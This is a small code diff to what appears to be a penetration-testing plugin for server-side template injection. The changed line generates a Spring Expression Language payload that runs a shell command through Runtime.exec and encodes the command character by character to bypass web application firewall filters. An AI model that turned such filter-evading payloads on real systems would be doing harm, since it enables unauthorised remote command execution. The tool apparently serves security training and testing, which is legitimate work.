@@ -430,7 +430,7 @@ class SSTIAttacksPlugin(ServicePlugin):
                             'name': 'Spring EL Character Concatenation Bypass',
                             'type': 'command',
                             'metadata': {
-                                'command': f'# Generate char concat payload to bypass filters\n# Example for "id" command:\necho "id" | python3 -c "import sys; cmd = sys.stdin.read().strip(); print(\'T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\' + \'.\'.join([f\'T(java.lang.Character).toString({ord(c)}).concat\' for c in cmd]) + \'()).getInputStream())\')"',
+                                'command': '# Generate char concat payload to bypass filters\n# Example for "id" command:\necho "id" | python3 -c "import sys; cmd = sys.stdin.read().strip(); print(\'T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\' + \'.\'.join([f\'T(java.lang.Character).toString({ord(char)}).concat\' for char in cmd]) + \'()).getInputStream())\')"',
                                 'description': 'Bypass WAF/filters by constructing command string via character concatenation',
                                 'tags': ['OSCP:MEDIUM', 'BYPASS', 'SSTI', 'WAF'],
                                 'flag_explanations': {
